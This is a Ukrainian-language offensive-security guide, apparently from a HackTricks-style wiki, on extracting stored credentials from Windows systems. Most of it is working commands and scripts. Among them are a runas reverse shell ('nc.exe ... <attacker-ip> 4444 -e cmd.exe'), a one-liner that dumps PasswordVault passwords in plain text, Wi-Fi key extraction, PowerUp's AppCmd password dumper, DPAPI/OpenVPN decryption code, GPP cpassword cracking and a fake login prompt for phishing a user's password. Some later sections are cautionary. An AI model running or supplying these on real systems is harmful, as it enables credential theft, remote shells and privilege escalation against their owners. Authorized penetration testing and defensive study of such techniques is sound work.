Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault, щоб застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.

Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати сховище, вона має певним чином **зв’язатися з диспетчером облікових даних і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.

Скористайтеся `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Потім можна скористатися `runas` з параметром `/savecred`, щоб використовувати збережені облікові дані. У наступному прикладі віддалений бінарний файл запускається через SMB-ресурс.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Зверніть увагу на mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) або модуль [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Сучасні програми Windows UWP, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді в `PasswordVault` платформи Universal Windows Platform (UWP) (також доступному як `Web Credentials` у `vaultcmd`). Це сховище ізольоване в межах сеансу, і його можна розшифрувати штатними засобами без прав адміністратора або `SeDebugPrivilege`.

Виконайте цю команду PowerShell в активному сеансі користувача, щоб миттєво отримати dump і розшифрувати всі збережені імена користувачів і паролі у відкритому вигляді:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, що значно підвищує ентропію.

**DPAPI дає змогу шифрувати ключі за допомогою симетричного ключа, похідного від секретів входу користувача**. У разі системного шифрування використовуються секрети автентифікації системи в домені.

Зашифровані RSA-ключі користувача за допомогою DPAPI зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` — це [ідентифікатор безпеки](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, що зберігається поруч із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому вивести його вміст за допомогою команди `dir` у CMD неможливо, хоча це можна зробити через PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Для розшифрування можна використовувати **модуль mimikatz** `dpapi::masterkey` з відповідними аргументами (`/pvk` або `/rpc`).

**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **модуль mimikatz** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
Ви можете **витягти багато DPAPI** **masterkeys** із **пам’яті** за допомогою модуля `sekurlsa::dpapi` (якщо ви root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Облікові дані PowerShell

**Облікові дані PowerShell** часто використовують для **скриптингу** й автоматизації, щоб зручно зберігати зашифровані облікові дані. Вони захищені за допомогою **DPAPI**, що зазвичай означає, що розшифрувати їх може лише той самий користувач на тому самому комп’ютері, де їх було створено.

Експортовані облікові дані можуть мати довільне ім’я файлу або шлях `.xml`. Якщо скрипт або інвентаризація файлів вказує на такий файл, визначте фактичний каталог профілю облікового запису, а не припускайте, що це `C:\Users`: [Windows може розміщувати профілі в іншому місці](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Файл, який можна прочитати, — лише зачіпка; [Windows `Export-Clixml` прив’язує зашифровані облікові дані до користувача й комп’ютера, які виконали експорт](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), а будь-який виявлений обліковий запис окремо має мати належні права на потрібній службі. Спершу перевірте шляхи й ACL, не виводячи зашифровані або відкриті значення під час звичайного переліку.

Щоб **розшифрувати** облікові дані PS із файлу, у якому вони містяться, виконайте:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Збережені RDP-з'єднання

Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
та в `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Нещодавно виконані команди

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Диспетчер облікових даних віддаленого робочого стола**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Use модуль **Mimikatz** `dpapi::rdg` з відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
За допомогою модуля `sekurlsa::dpapi` у **Mimikatz** можна **витягти з пам’яті багато DPAPI masterkeys**

**mRemoteNG використовує інше сховище підключень.** Перевірте читабельні XML-файли в `%APPDATA%\mRemoteNG` і папці Documents користувача, зокрема файли зі звичайними назвами, як-от `config.xml`. Перш ніж вважати XML-файл потенційним джерелом облікових даних, визначте його схему підключень і перевірте наявність зашифрованих атрибутів `Password`. Збережене значення — це не пароль DPAPI/RDCMan; його відновлення залежить від параметрів шифрування файлу та від того, чи використовувався власний master password. Під час масового пошуку не виводьте зашифровані значення.

**Експорти профілів Remote Desktop Plus** також можуть бути доступними для читання в каталогах користувачів або спільній папці адміністрування. Експорт `profiles.xml` старого формату містить записи `Data/Profile` з елементами `ProfileName`, `Password` і `Secure`. Вважайте непорожній елемент пароля потенційною знахідкою облікових даних, але не виводьте його та не припускайте, що це відкритий текст: [за інформацією виробника](https://www.donkz.nl/), захист профілю може бути прив’язаний до облікового запису й комп’ютера, на яких його створили, або налаштований менш суворо. Перш ніж покладатися на такі дані, перевірте походження файлу та умови відновлення.

### Sticky Notes

Люди іноді зберігають паролі та іншу інформацію в застосунках для нотаток. Упакований застосунок Sticky Notes від Microsoft зазвичай зберігає нотатки в `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; старіші чи інші застосунки можуть використовувати інші сховища в профілі користувача, зокрема LevelDB. Перш ніж вважати відсутність файла SQLite доказом того, що нотаток немає, визначте встановлений застосунок і формат сховища.

Якщо Sticky Notes використовує журналювання SQLite з випереджальним записом (WAL), копія лише `plum.sqlite` може не містити останніх зафіксованих нотаток. Зберігайте відповідний `plum.sqlite-wal` разом із узгодженою копією бази даних і додавайте `plum.sqlite-shm`, якщо він доступний; індекс спільної пам’яті можна перебудувати, але WAL є частиною постійного стану бази даних. Див. [документацію SQLite щодо WAL](https://www.sqlite.org/wal.html). Нотатка з іменем облікового запису чи паролем — лише потенційна знахідка облікових даних: окремо перевірте обліковий запис, дозволений доступ і повторне використання пароля. Запис із зашифрованого менеджера паролів також потребує справжнього ключа розшифрування та інтерпретації, специфічної для застосунку, перш ніж він може підтвердити наявність входу з вищими привілеями.

### AppCmd.exe

**Зверніть увагу: щоб відновити паролі з AppCmd.exe, потрібно мати права адміністратора й запускати його з рівнем цілісності High Integrity.**\
**AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
Якщо цей файл існує, можливо, налаштовано облікові дані, які можна **відновити**.

Цей код узято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Перевірте, чи існує `C:\Windows\CCM\SCClient.exe`.\
Інсталятори **запускаються з привілеями SYSTEM**, багато з них вразливі до **DLL Sideloading (інформація з** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Файли та реєстр (облікові дані)

### Артефакти облікових даних засобів віддаленої підтримки в реєстрі

Деякі старі інсталяції засобів віддаленої підтримки зберігають назви значень, пов’язані з паролями, у фіксованих ключах реєстру програм. Наприклад, `SecurityPasswordAES` у TeamViewer позначав налаштований статичний пароль сеансу у версіях до 9, згідно з [vendor's registry-key explanation](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Маркер у назві значення — лише підказка для перевірки: перш ніж оцінювати ці облікові дані, перевірте встановлену версію, доступність даних значення для читання, формат і поточну поведінку автентифікації. Перехід від пароля віддаленої підтримки до облікового запису Windows із більшими привілеями додатково вимагає фактичного повторного використання пароля та наявності дозволу для цього облікового запису. Не виводьте зашифровані дані та відновлені паролі під час звичайного переліку.

### Спільні електронні таблиці із захищеними аркушами

Якщо є підозра, що доступна для читання спільна книга містить дані облікових записів, розрізняйте **шифрування файлу** та захист аркуша чи приховані стовпці. [Microsoft states](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), що захист аркуша обмежує редагування й не є засобом безпеки; сам по собі він не підтверджує шифрування вмісту книги. Перевіряйте лише дозволені та релевантні файли й не виводьте потенційні секрети під час широкого переліку. Наявність доступного для читання шляху до `.xlsx`, захищеного аркуша чи прихованого стовпця сама по собі не доводить, що там є облікові дані або що будь-який обліковий запис має вищі привілеї; окремо перевірте фактичні дані та поточні права облікового запису.

### Збережені патчі змін на CI-сервері

CI-сервер може зберігати надіслані зміни вихідного коду у своєму каталозі даних навіть після завершення збірки. [TeamCity documents](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` як сховище змін віддаленого запуску; каталог даних можна налаштувати, і він не обов’язково розміщений у `ProgramData`. Доступний для читання патч може зберегти видалені або додані посилання на файл облікових даних, ключ шифрування чи скрипт, що використовує обидва. Наприклад, для робочого процесу PowerShell із `ConvertTo-SecureString -Key` потрібні і ключ AES, і зашифрований рядок; [Microsoft documents](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), що ключ надається окремо. Спочатку перевіряйте лише доступні для перегляду назви патчів, а потім — за наявності дозволу — релевантний вміст, не виводячи секрети під час звичайного переліку. Шлях до патча, зашифроване значення чи посилання на ключ самі по собі не доводять наявності дійсних облікових даних або доступу з вищими привілеями. Обмежте ACL каталогу даних і не додавайте секрети до змін збірки.

### Власна ротація паролів локального адміністратора

Саморобний засіб ротації паролів може зберігати зашифрований пароль локального адміністратора в локальній службі, а облікові дані до сховища даних — у доступному для читання файлі `.env` або поруч із двійковим файлом засобу оновлення. Перевіряйте разом заплановане завдання засобу оновлення, обліковий запис, ACL конфігураційних файлів, слухач і дозволи сховища даних. До сховища даних, прив’язаного лише до loopback-інтерфейсу, усе одно може підключитися локальний користувач із дійсними обліковими даними, але сама автентифікація не доводить наявності дозволу на читання потрібних записів. Якщо початкове значення або матеріал ключа шифрування доступні поруч із шифротекстом, перед тим як довіряти шифруванню, перевірте точний алгоритм виведення ключа. Схема, яка детерміновано виводить ключ AES із відкритого початкового значення за допомогою Go [`math/rand`](https://pkg.go.dev/math/rand), непридатна для захисту цього пароля; у документації Go зазначено, що цей пакет не підходить для криптографічно важливої генерації випадкових чисел. Перш ніж вважати відновлений пароль шляхом підвищення привілеїв, підтвердьте, що він актуальний і належить обліковому запису, який входить до групи локальних адміністраторів. Саме лише заплановане завдання, шлях до `.env` чи зашифрований блок не підтверджують жодної з цих умов. Не виводьте паролі та матеріал ключа під час звичайного переліку.

Для керування паролями локальних адміністраторів використовуйте [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Його сховище на основі каталогу або Entra та засоби контролю доступу відрізняються від власного локального сховища даних; [Elasticsearch roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) також визначають, чи може автентифікований користувач сховища читати певний індекс.

### Архіви плагінів Java-сервера та повторне використання облікових даних

Деякі плагіни Java-серверів розповсюджуються як JAR-архіви в каталозі сервера `plugins`. Доступний для читання власний плагін може містити вбудовані облікові дані служби в конфігурації або байткоді. Перевіряйте архів лише за наявності дозволу й не виводьте відновлені секрети під час звичайного переліку. Сам шлях до плагіна не доводить, що секрет існує, а відновлений пароль служби веде до вищих привілеїв лише за умови, що він також дійсний для облікового запису з більшими привілеями. Перевірте відповідні ACL файлів і замініть повторно використані облікові дані на окремі секрети. Див. [PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) щодо структури каталогів і [Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) щодо вмісту архівів.

### Облікові дані вбудованої бази даних Openfire

Інсталяція Openfire із вбудованою базою даних може містити файл `openfire.script` у каталозі `Openfire\embedded-db`. Якщо поточний обліковий запис може його читати, перегляньте записи `OFUSER` разом із властивістю `passwordKey`. У [user-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) Openfire зазначено, що паролі можуть зберігатися у відкритому тексті або шифруватися ключем, що міститься в цій властивості. Відновлений пароль має значення для підвищення привілеїв лише тоді, коли він іще дійсний для ідентифікатора з більшими привілеями; сама назва файлу не доводить ані наявності доступу для читання, ані повторного використання облікових даних. Цей шлях — лише підказка для інвентаризації, тому не виводьте вміст бази даних та облікові дані під час звичайного переліку.

Окремий файл `Openfire\conf\openfire.xml` може містити налаштовані порти та інтерфейс прив’язки консолі адміністратора, навіть якщо використовується зовнішня база даних. Зазвичай Openfire прив’язує консоль адміністратора до loopback-інтерфейсу; попри це, локальний обліковий запис може отримати доступ до адреси, якщо слухач запущений. Перевірте разом фактичний слухач, авторизовану роль адміністратора, політику завантаження плагінів і обліковий запис, від імені якого працює служба Openfire. Адміністратор, який може встановлювати плагін, може запустити його код у контексті служби, що може мати значні привілеї, якщо служба працює від імені LocalSystem. Збіг пароля облікового запису чи доступний для читання шлях до конфігурації самі по собі не доводять доступу до консолі адміністратора або виконання коду. Див. документацію постачальника [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) і [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Конфігурація сервера керування цифровою криміналістикою

Конфігурації сервера Velociraptor, які зазвичай мають назву `server.config.yaml`, можуть містити `CA.private_key` внутрішнього центру сертифікації (CA). Якщо користувач із меншими привілеями може читати цей ключ, він може мати змогу випустити клієнтський сертифікат API. Чи призведе це до вищих привілеїв, залежить від ролей користувачів на сервері, доступності API та контексту ідентифікатора, від імені якого виконується сервер або цільовий агент. Клієнтська конфігурація містить інші дані; її виявлення не підтверджує доступу до CA сервера. У деяких розгортаннях закритий ключ CA зберігається офлайн, тому доступна для читання конфігурація сервера може не містити ключа підпису.

На сервері Windows перевірте ACL **серверної** конфігурації в каталозі інсталяції та будь-яких захищених резервних копій. Одне з можливих розташувань — `%ProgramFiles%\VelociraptorServer\server.config.yaml`; якщо шлях налаштованої служби відрізняється, використовуйте його. Переконайтеся, що поточний ідентифікатор може читати файл і що `CA.private_key` справді присутній. Не виводьте закритий ключ у журнали чи під час переліку. Робочий процес постачальника `config api_client` використовує ключ CA для випуску клієнтського сертифіката, але також потрібна ефективна роль на сервері; її створення або змінення може вимагати дозволу на запис у сховище даних або перезапуску. Наявний привілейований ідентифікатор сервера може забезпечити шлях, навіть якщо такий запис недоступний. Запити API з правами на виконання працюють у відповідному контексті сервера або агента, який може мати значні привілеї.

Захищайте конфігурацію сервера та резервні копії обмежувальними ACL, за можливості зберігайте ключ підпису CA офлайн і обмежуйте ролі API та доступ до слухачів. Див. [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) і [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/).

### Облікові дані Putty

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY — це окремий менеджер сеансів. Його власне зашифроване сховище може розташовуватися за шляхом `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, а експортована резервна копія сеансів може називатися `sessions-backup.dat` і зберігатися в іншому місці. У [посібнику SolarWinds з експорту](https://thwack.solarwinds.com/discussion/comment/115591) зазначено, що експорти зашифровані паролем і можуть містити сеанси, ключі, скрипти, теги та зв’язки; у [форумі підтримки](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) вказано розташування власного сховища. Спершу перевірте дозволи на файли та шляхи. Виявлення будь-якого з цих файлів не розкриває його пароль і не доводить, що збережені облікові дані залишаються дійсними або дають вищі привілеї.

### Ключі SSH-хостів PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-ключі в реєстрі

Приватні SSH-ключі можуть зберігатися в розділі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тож перевірте, чи є там щось цікаве:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Докладніше про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Якщо служба `ssh-agent` не запущена й ви хочете, щоб вона автоматично запускалася під час завантаження, виконайте:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Схоже, ця техніка більше не працює. Я спробував створити кілька SSH-ключів, додати їх за допомогою `ssh-add` і ввійти на машину через SSH. Розділу реєстру HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.

### Файли автоматичної інсталяції

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_

Приклад вмісту:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Резервні копії SAM і SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Доступні для читання резервні копії Windows Imaging (`.wim`) також можуть містити офлайн-вулики `SAM`, `SECURITY` і `SYSTEM`. Насамперед перевіряйте локально доступні каталоги резервних копій або образів і переглядайте **імена файлів у складі** образу, перш ніж щось із нього витягувати: сама назва файлу `.wim` не доводить, що в ньому є вулики, а типові `install.wim`, `boot.wim` і образи відновлення часто виявляються хибними зачіпками. SMB-ресурс — це окремий шлях доступу, який слід перевіряти лише тоді, коли цей ресурс входить до сфери перевірки. Див. [рекомендації Microsoft щодо образів Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) і [довідку з файлів вуликів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Облікові дані хмари

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Знайдіть файл із назвою **SiteList.xml**

### Кешований пароль GPP

Раніше була доступна функція розгортання власних локальних облікових записів адміністратора на групі машин за допомогою Group Policy Preferences (GPP). Однак цей метод мав серйозні недоліки безпеки. По-перше, будь-який користувач домену міг отримати доступ до об’єктів групової політики (GPO), що зберігалися у SYSVOL як XML-файли. По-друге, будь-який автентифікований користувач міг розшифрувати паролі в цих GPP, зашифровані AES256 із використанням загальнодоступного задокументованого ключа за замовчуванням. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.

Щоб зменшити цей ризик, було розроблено функцію для пошуку локально кешованих файлів GPP, які містять непорожнє поле "cpassword". Знайшовши такий файл, функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, що допомагає виявити й усунути цю вразливість безпеки.

Шукайте ці файли в `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Щоб розшифрувати cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Використання crackmapexec для отримання паролів:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Приклад web.config з обліковими даними:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Резервні архіви у вебкорені IIS

Старий ZIP-архів резервної копії, розміщений безпосередньо у вебкорені, з якого сервер віддає файли, може розкрити попередні файли конфігурації та облікові дані, які можна повторно використати. Перш ніж вважати це витоком, перевірте налаштований фізичний шлях сайту та чи справді архів доступний через HTTP. Шлях за замовчуванням `C:\inetpub\wwwroot` — лише один із можливих варіантів. Швидка локальна інвентаризація може вивести назви й розміри файлів, не відкриваючи архіви:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Назва архіву не доводить, що він містить секрет або що відновлені облікові дані надають вищі привілеї.

### Облікові дані OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Журнали

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Запросити облікові дані

Ви завжди можете **попросити користувача ввести свої облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **безпосередньо запитувати** клієнта про **облікові дані** справді **ризиковано**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Можливі назви файлів, що містять облікові дані**

Відомі файли, які колись містили **паролі** у **відкритому тексті** або Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
